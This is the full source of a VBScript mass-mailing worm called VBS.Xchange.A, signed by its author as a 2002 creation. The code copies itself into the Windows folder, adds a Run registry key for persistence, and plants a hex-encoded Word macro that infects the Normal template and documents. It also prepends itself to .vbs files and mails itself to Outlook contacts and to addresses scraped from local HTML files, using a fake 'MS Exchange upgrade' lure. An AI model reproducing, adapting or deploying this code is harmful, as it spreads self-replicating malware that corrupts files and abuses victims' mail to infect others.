'VBS.Xchange.A
On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
Set fl=fso.OpenTextFile(WScript.ScriptFullname,1)
virus=fl.ReadAll
fl.Close

Set win=fso.GetSpecialFolder(0)
fcopy=win&"\MSXchange.vbs"
reg="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
fso.GetFile(WScript.ScriptFullName).Copy(fcopy)
ws.RegWrite reg&"\MsExchange",fcopy

set sp=fso.CreateTextFile("C:\XChange.vba",True,8)
sp.WriteLine "Attribute VB_Name = ""Xchange"""
sp.WriteLine "Sub AutoOpen()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "e = """""

For i=1 To len(virus)

e=Mid(virus,i,1)
e=Hex(Asc(e))

If Len(e)=1 Then
e="0"&e
End If

f=f+e
If Len(f)=110 Then
sp.WriteLine "e = e + """+f+""""
f=""
End If

If Len(virus)-i = 0 Then
sp.WriteLine "e = e + """+f+""""
f=""
End If

Next

sp.WriteLine "read=dec(e)"
sp.WriteLine "Open ""C:\xchange.vbs"" For Output As #1"
sp.WriteLine "Print #1, read"
sp.WriteLine "Close #1"
sp.WriteLine "Shell ""wscript C:\xchange.vbs"""
sp.WriteLine "Call infect_fichier"
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Sub HelpAbout()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "MsgBox ""This is my very first VBS-W97M Worm"", vbInformation, ""I-Worm.Xchange"""
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Sub AutoClose()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "FileSystem.Kill ""C:\xchange.vbs"""
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Sub infect_fichier()"
sp.WriteLine "On Error Resume Next"
sp.WriteLine "Set nor = NormalTemplate.VBProject.VBComponents"
sp.WriteLine "Set doc = ActiveDocument.VBProject.VBComponents"
sp.WriteLine "df = ""C:\XChange.vba"""
sp.WriteLine "If nor.Item(""Xchange"").Name <> ""Xchange"" Then"
sp.WriteLine "   doc(""Xchange"").Export df"
sp.WriteLine "   nor.Import df"
sp.WriteLine "End If"
sp.WriteLine "If doc.Item(""Xchange"").Name <> ""Xchange"" Then"
sp.WriteLine "   nor(""Xchange"").Export df"
sp.WriteLine "   doc.Import df"
sp.WriteLine "   ActiveDocument.Save"
sp.WriteLine "End If"
sp.WriteLine "End Sub"
sp.WriteLine ""
sp.WriteLine "Function dec(octe)"
sp.WriteLine "For hexad = 1 To Len(octe) Step 2"
sp.WriteLine "dec = dec & Chr(""&h"" & Mid(octe, hexad, 2))"
sp.WriteLine "Next"
sp.WriteLine "End Function"
sp.Close

infvbs(win)
infvbs(fso.GetSpecialFolder(1))

SendWithOutlook()

Set wd=CreateObject("Word.Application")

If ws.RegRead ("HKLM\Software\Microsoft\MsXchange") <> "Coded by PetiK (c)2002" then
CN = CreateObject("WScript.NetWork").ComputerName
Set srch=wd.Application.FileSearch
srch.Lookin = "C:\": srch.SearchSubFolders = True: srch.FileName="*.doc;*.dot":
srch.Execute
Set sp=fso.OpenTextFile(fcopy,8)
sp.WriteLine "'On "&date& " at "&time&" from "&CN
sp.WriteLine "'Number of DOC and DOT file found : "& srch.FoundFiles.Count
sp.WriteBlankLines(1)
sp.Close
ws.RegWrite "HKLM\Software\Microsoft\MsXchange","Coded by PetiK (c)2002"
End If

Set vba=wd.NormalTemplate.VBProject.VBComponents
If vba.Item("Xchange").Name <> "Xchange" Then
   vba.Import "C:\XChange.vba"
   wd.Application.NormalTemplate.Save
   End If
wd.Application.NormalTemplate.Close
wd.Application.Quit

Set mel=fso.CreateTextFile(win&"\kitep.wab.txt",8,TRUE)
counter=0
lect()
mel.WriteLine "#"
mel.Close
WScript.Quit

Sub lect()
On Error Resume Next
Set dr=fso.Drives
For Each d in dr
If d.DriveType=2 or d.DriveType=3 Then
list(d.path&"\")
End If
Next
End Sub

Sub spreadmailto(dir)
On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set f=fso.GetFolder(dir)
Set cf=f.Files
For Each fil in cf
ext=fso.GetExtensionName(fil.path)
ext=lcase(ext)
if (ext="htm") or (ext="html") or (ext="htt") or (ext="asp") Then

set htm=fso.OpenTextFile(fil.path,1)
verif=True
allhtm=htm.ReadAll()
htm.Close
For ml=1 To Len(allhtm)
count=0
If Mid(allhtm,ml,7) = "mailto:" Then
counter=counter+1
mlto=""
Do While Mid(allhtm,ml+6+count,1) <> """"
count=count+1
mlto = mlto + Mid(allhtm,ml+6+count,1)
loop
mel.WriteLine counter &" <"&left(mlto,len(mlto)-1)&">"

sendmailto(left(mlto,len(mlto)-1))

End If

Next

End If
Next
End Sub

Sub list(dir)
On Error Resume Next
Set f=fso.GetFolder(dir)
Set ssf=f.SubFolders
For Each fil in ssf
spreadmailto(fil.path)
list(fil.path)
Next
End Sub


Sub sendmailto(email)
Set out=CreateObject("Outlook.Application")
Set mailmelto=out.CreateItem(0)
mailmelto.To email
mailmelto.Subject "Upgrade Ms Exchange"
mailmelto.Body "Run this attached file to upgrade Ms Exchange"
mailmelto.Attachment.Add (WScript.ScriptFullName)
mailmelto.DeleteAfterSubmit = True
mailmelto.Send
Set out = Nothing
End Sub

Sub SendWithOutlook()
Set A=CreateObject("Outlook.Application")
Set B=A.GetNameSpace("MAPI")
For Each C In B.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.count
Set E=C.AddressEntries(D)
Set F=A.CreateItem(0)
F.To=E.Address
F.Subject="Update and upgrade MS Exchange."
F.Body="run this attached file to update Ms Exchange. See you soon."
Set G=CreateObject("Scripting.FileSystemObject")
F.Attachments.Add(fcopy)
F.DeleteAfterSubmit=True
If F.To <> "" Then
F.Send
End If
Next
End If
Next
End Sub

Function infvbs(Folder)
If f.FolderExists(Folder) then

For each P in f.GetFolder(Folder).Files
ext=f.GetExtensionName(P.Name)
If ext="vbs" or ext="vbe" Then
Set VF=f.OpenTextFile(P.path, 1)
mark=VF.Read(14)
VF.Close

If mark <> "'VBS.Xchange.A" Then
Set VF=f.OpenTextFile(P.path, 1)
VC=VF.ReadAll
VF.Close
VCd=virus & VC
Set VF=f.OpenTextFile(P.path,2,True)
VF.Write VCd
VF.Close
End If

End If
Next

End If
End Function
